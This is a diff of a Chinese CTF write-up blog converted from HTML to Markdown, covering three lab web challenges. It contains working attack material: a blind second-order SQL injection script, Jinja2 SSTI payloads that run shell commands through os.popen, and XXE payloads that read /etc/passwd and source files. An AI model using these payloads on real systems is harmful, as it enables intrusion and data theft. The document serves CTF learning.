-<p>感觉这东西像二次注入+<code>insert</code>注入拼起来，但还是不知道怎么回事。。找机会问问别人╮(╯-╰)╭</p>
-<p><code>1&#39;and&#39;0</code>:</p>
-<p><img src="/img/wdbunfinish8.png" srcset="/img/loading.gif" lazyload alt="wdbunfinish8"></p>
-<p>单引号闭合，而且<code>1&#39;and&#39;0</code>这东西变成了<code>0</code>。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">#<span class="hljs-keyword">sql</span>的字符串运算<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-operator">+</span> <span class="hljs-string">&#x27;2&#x27;</span><br># <span class="hljs-number">3</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">+</span>database()<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>#<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-operator">+</span>hex(database())<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>#<span class="hljs-number">776562</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> web的<span class="hljs-number">16</span>进制<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-operator">+</span>ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>#<span class="hljs-number">119</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> w的ascii码<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-operator">+</span>ascii(substr(database() <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>))<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>##<span class="hljs-number">119</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> w的ascii码<br><br></code></pre></td></tr></table></figure>
+感觉这东西像二次注入+`insert`注入拼起来，但还是不知道怎么回事。。找机会问问别人╮(╯-╰)╭
 
+`1'and'0`:
 
+![wdbunfinish8](img/wdbunfinish8.png)
 
-<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#爆库:web</span><br><span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;0&#x27;+ascii(substr((database()) from &#123;&#125; for 1))+&#x27;0&quot;</span><span class="hljs-string">.format</span><span class="hljs-params">(i)</span><br><span class="hljs-comment">#爆表</span><br><span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0&quot;</span><span class="hljs-string">.format</span><span class="hljs-params">(i)</span><br></code></pre></td></tr></table></figure>
+单引号闭合，而且`1'and'0`这东西变成了`0`。
 
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">#<span class="hljs-keyword">sql</span>的字符串运算：数值相加<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-operator">+</span> <span class="hljs-string">&#x27;2&#x27;</span> <br># <span class="hljs-number">3</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">+</span>database()<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>#<span class="hljs-number">1</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-operator">+</span>hex(database())<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>#<span class="hljs-number">776562</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> web的<span class="hljs-number">16</span>进制<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-operator">+</span>ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>#<span class="hljs-number">119</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> w的ascii码<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-operator">+</span>ascii(substr(database() <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>))<span class="hljs-operator">+</span><span class="hljs-string">&#x27;0&#x27;</span>;<br>##<span class="hljs-number">119</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> w的ascii码<br>#参考：https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>blog.csdn.net<span class="hljs-operator">/</span>zzzgd_666<span class="hljs-operator">/</span>article<span class="hljs-operator">/</span>details<span class="hljs-operator">/</span><span class="hljs-number">121704012</span><br>#	  https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>xz.aliyun.com<span class="hljs-operator">/</span>t<span class="hljs-operator">/</span><span class="hljs-number">10594</span><br></code></pre></td></tr></table></figure>
 
+![wdbunfinish13](img/wdbunfinish13.png)
 
+`0'+hex(database())+'0`
 
+![wdbunfinish9](img/wdbunfinish9.png)
+
+注意这里是十六进制，转换成字符串就是`web`
+
+爆表的话`information`这东西被正则匹配掉了，回显`nonono`。当时想着还能用`sys`库去代替`information_schema`：
+
+![wdbunfinish10](img/wdbunfinish10.png)
+
+先尝试`0'+hex(hex(version()))+'0`
+
+![wdbbbbbbbbbbunfinifh11](img/wdbbbbbbbbbbunfinifh11.png)
+
+出了这么个东西，使用两次`hex`主要就是为了消除`abcd`这种字母，而且因为长字符串转成数字型数据的时候会变成科学计数法导致也就是说会丢失数据精度，所以可以一位一位的截。`https://xz.aliyun.com/t/2619#toc-3`
+
+注意这个数据库的版本：(底下代码`select * from flag`换成`version()`就行)
+
+![wdbunfinish12](img/wdbunfinish12.png)
+
+师傅们的`wp`里都是直接`select * from flag`，`flag`这个表是猜出来的。。
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">//参考https://www.cnblogs.com/upfine/p/<span class="hljs-number">16607426.</span>html<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    url = <span class="hljs-string">&#x27;http://7d3b4912-e6bb-4111-b640-7ab9e2fea080.node4.buuoj.cn:81/&#x27;</span><br>    register_url = url + <span class="hljs-string">&#x27;register.php&#x27;</span><br>    login_url = url + <span class="hljs-string">&#x27;login.php&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        register_data = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;@1.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>                 <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        login_data = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;@1.com&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        requests.post(register_url, data=register_data)<br>        response_login = requests.post(login_url, data=login_data)<br>        bs = BeautifulSoup(response_login.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>) <span class="hljs-comment"># 这行代码创建了一个BeautifulSoup对象，用于解析网页的HTML内容。response_login.text是一个包含网页HTML内容的字符串，&#x27;html.parser&#x27;是指定使用HTML解析器来解析网页</span><br>        username = bs.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-name&#x27;</span>)  <span class="hljs-comment"># 取返回页面数据的span class=user-name属性</span><br>        number = username.text  <br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(number))<br>        <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    get_flag()<br></code></pre></td></tr></table></figure>
 
+当然还有利用两次`hex`去转换的，原理和上面差不多:
+
+`0'%2B(select substr(hex(hex((select * from flag))) from 1 for 1))%2B'0`
 
 
-<p>后面看了其它师傅的<code>wp</code>，发现还有其它方法:</p>
-<p>参考<code>https://syunaht.com/p/3379740036.html</code></p>
-<h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p><img src="/img/doublescret1.png" srcset="/img/loading.gif" lazyload alt="doublescret1"></p>
-<p><code>dirsearch</code>没扫出来啥，试了试<code>/secret</code>:</p>
-<p><img src="/img/doublesecret2.png" srcset="/img/loading.gif" lazyload alt="doublesecret2"></p>
-<p><code>/secret?secret=1</code></p>
-<p><img src="/img/doublesecret3.png" srcset="/img/loading.gif" lazyload alt="doublesecret3"></p>
-<p><code>/secret?secret=secret</code>，开了<code>Debug</code>，发现有这么段东西：</p>
-<p><img src="/img/ciscndoublesrecreet1.png" srcset="/img/loading.gif" lazyload alt="ciscndoublesrecreet1"></p>
+
+参考`https://syunaht.com/p/3379740036.html`
+
+`https://xz.aliyun.com/t/2619#toc-3`
+
+
+
+## [CISCN2019 华东南赛区]Double Secret
+
+![doublescret1](img/doublescret1.png)
+
+`dirsearch`没扫出来啥，试了试`/secret`:
+
+![doublesecret2](img/doublesecret2.png)
+
+`/secret?secret=1`
+
+![doublesecret3](img/doublesecret3.png)
+
+`/secret?secret=secret`，开了`Debug`，发现有这么段东西：
+
+![ciscndoublesrecreet1](img/ciscndoublesrecreet1.png)
+
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span>(secret==<span class="hljs-literal">None</span>):<br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span><br>   rc=rc4_Modified.RC4(<span class="hljs-string">&quot;HereIsTreasure&quot;</span>)   <span class="hljs-comment">#解密，这个算法应该是RC4,然后密钥是HereIsTreasure</span><br>   deS=rc.do_crypt(secret) <span class="hljs-comment"># 加密secret</span><br><br>   a=render_template_string(safe(deS)) <span class="hljs-comment"># deS经过safe过滤然后渲染</span><br><br>   <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;ciscn&#x27;</span> <span class="hljs-keyword">in</span> a.lower():<br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;flag detected!&#x27;</span><br>   <span class="hljs-keyword">return</span> a<br></code></pre></td></tr></table></figure>
 
-<p>奇怪的是<code>rc=rc4_Modified.RC4(&quot;HereIsTreasure&quot;)</code>的注释是解密？</p>
-<p><code>RC4</code>找了个网站：<code>http://tool.chacuo.net/cryptrc4</code>，这个结果是一致的(有些虽然也是<code>RC4</code>但结果不一样)：数据加密后是<code>base64</code>编码，然后把它解码就行了。</p>
-<p>后面看wp发现有大佬直接自己写脚本。。太强了orz：</p>
+奇怪的是`rc=rc4_Modified.RC4("HereIsTreasure")`的注释是解密？
+
+`RC4`找了个网站：`http://tool.chacuo.net/cryptrc4`，这个结果是一致的(有些虽然也是`RC4`但结果不一样)：数据加密后是`base64`编码，然后把它解码就行了。
+
+后面看wp发现有大佬直接自己写脚本。。太强了orz：
+
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_main</span>(<span class="hljs-params">key = <span class="hljs-string">&quot;init_key&quot;</span>, message = <span class="hljs-string">&quot;init_message&quot;</span></span>):<span class="hljs-comment">#返回加密后得内容</span><br>    s_box = rc4_init_sbox(key)<br>    crypt = <span class="hljs-built_in">str</span>(rc4_excrypt(message, s_box))<br>    <span class="hljs-keyword">return</span>  crypt<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init_sbox</span>(<span class="hljs-params">key</span>):<br>    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s_box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span><br>        s_box[i], s_box[j] = s_box[j], s_box[i]<br>    <span class="hljs-keyword">return</span> s_box<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_excrypt</span>(<span class="hljs-params">plain, box</span>):<br>    res = []<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + box[i]) % <span class="hljs-number">256</span><br>        box[i], box[j] = box[j], box[i]<br>        t = (box[i] + box[j]) % <span class="hljs-number">256</span><br>        k = box[t]<br>        res.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s) ^ k))<br>    cipher = <span class="hljs-string">&quot;&quot;</span>.join(res)<br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>(base64.b64encode(cipher.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>key = <span class="hljs-string">&quot;HereIsTreasure&quot;</span>  <span class="hljs-comment">#此处为密文</span><br>message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入明文:\n&quot;</span>)<br>enc_base64 = rc4_main( key , message )<br>enc_init = <span class="hljs-built_in">str</span>(base64.b64decode(enc_base64),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>enc_url = parse.quote(enc_init)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)<br></code></pre></td></tr></table></figure>
 
 
 
-<p>他这个加密过程大致是我们的输入<code>secret</code>经过<code>RC4</code>后是<code>base64</code>编码，然后渲染输出<code>base64</code>解码的结果。</p>
-<p>存在<code>render_template_string</code>，参数又是可控的，猜测是<code>SSTI</code>。</p>
-<p>我们需要让它<code>render_template_string</code>的参数是<code>payload</code></p>
-<p>先试试<code>&#123;&#123;config&#125;&#125;</code>:<code>.%14ZZ%C2%A4%01%02iv%C2%80</code></p>
-<p><img src="/img/doublesecret5.png" srcset="/img/loading.gif" lazyload alt="doublesecret5"></p>
-<p>加密：</p>
-<p><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></p>
+他这个加密过程大致是我们的输入`secret`经过`RC4`后是`base64`编码，然后渲染输出`base64`解码的结果。
+
+存在`render_template_string`，参数又是可控的，猜测是`SSTI`。
+
+我们需要让它`render_template_string`的参数是`payload`
+
+先试试`&#123;&#123;config&#125;&#125;`:`.%14ZZ%C2%A4%01%02iv%C2%80`
+
+![doublesecret5](img/doublesecret5.png)
+
+加密：
+
+`&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></p>
 <p><code>/secret?secret=.J%19S¥%15Km%2B%C2%94ÖS%C2%85%C2%8F¸%C2%97%0B%C2%90X5¤AßMD®%07%C2%8BSß7Ø%12Åré%1Bä*çwÛ%C2%9Eñh%1D%C2%82%25íô%06)%7Fðo%2C%C2%9E9%08Ç÷u.û%C2%95%14¿v%05%19j®LÚ-ãt¬%7FX%2C8L%C2%81ÑHÿöãÚõ%C2%9A¦%23%06§¸»¹ænyØÊj»%25X%15×%C2%84F%24%1As^%C2%9B×¤ j¥/%17%1Cßs¯6Å¥±.è¢Y!¨à%10%C2%8Aa]\%2BÎ°%C2%99à¾%C2%87-%10x ]Ú%0B%C2%882PãÜ%1A%3A%3Fæ² ¢Â¹%0F%0BÕG%23-é¢%19Å²%C2%8F&quot;î£%C2%93lÊ&#123;%03ù¶%C2%92×%11 Üîê%02`
 
 ![doublesecret4](img/doublesecret4.png)
@@ -485,6 +621,52 @@
 
 读`flag.txt`:`&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag.txt').read()")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></p>
 <p><code>.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B6%C3%A3%C3%9A%C3%B5%C2%9A%C2%A6%23%06%C2%A7%C2%B8%C2%BB%C2%B9%C3%A6ny%C3%98%C3%8Aj%C2%BB%25X%15%C3%97%C2%84F%24%1As%5E%C2%9B%C3%97%C2%A4%20j%C2%A5/%17%1C%C3%9Fs%C2%AF6%C3%85%C2%A5%C2%B1.%C3%A8%C2%A2Y%21%C2%A8%C3%A0%10%C2%8Aa%5D%5C%2B%C3%8E%C2%B0%C2%99%C3%A0%C2%BE%C2%87-%10x%20%5D%C3%9A%0B%C2%882P%C3%A3%C3%93%08n0%C3%AE%C3%BDb%C2%B1%C3%80%C3%B6%1F%5B%C2%88B%23~%C3%A6%C2%BC%5D%C2%81%C3%BF%C3%88d%C2%AE%C2%B8%C3%8E2%C2%92%20C%C2%B7%C2%B7%C2%95%C3%95Wj%C3%93%C2%B5%C3%AA_%C2%A1%2B%C2%87%C2%B5l%08%27%3F%C3%96</code></p>
+<h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>先看源码：</p>
+<p><img src="/img/truecookbook1.png" srcset="/img/loading.gif" lazyload alt="truecookbook1"></p>
+<p>直接访问，但：</p>
+<p><img src="/img/truecookbook2.png" srcset="/img/loading.gif" lazyload alt="truecookbook2"></p>
+<p>没法访问，这里应该是要传东西进去</p>
+<p>抓包：</p>
+<p><img src="/img/rutecookbook4.png" srcset="/img/loading.gif" lazyload alt="rutecookbook4"></p>
+<p>请求与响应包的携带的数据都是<code>XML</code>格式，并且返回包中的<code>msg</code>标签值与请求包中的<code>username</code>标签值相同。尝试使用<code>XXE</code>，数据注入点在<code>username</code>标签：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-symbol">&amp;file;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br>        123<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/truecookbook5.png" srcset="/img/loading.gif" lazyload alt="truecookbook5"></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-symbol">&amp;file;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br>        123<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/truecookbook6.png" srcset="/img/loading.gif" lazyload alt="truecookbook6"></p>
+<p>伪协议读<code>doLogin.php</code>(路径根据之前的报错)</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-symbol">&amp;file;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br>        123<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* autor: c0ny1</span><br><span class="hljs-comment">* date: 2018-2-7</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$USERNAME</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <span class="hljs-comment">//账号</span><br><span class="hljs-variable">$PASSWORD</span> = <span class="hljs-string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="hljs-comment">//密码</span><br><span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><span class="hljs-keyword">try</span>&#123;<br>	<span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>	<span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>	<span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br><br>	<span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;<br>	<span class="hljs-variable">$password</span> = <span class="hljs-variable">$creds</span>-&gt;password;<br><br>	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$USERNAME</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$PASSWORD</span>)&#123;<br>		<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);<br>	&#125;<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span 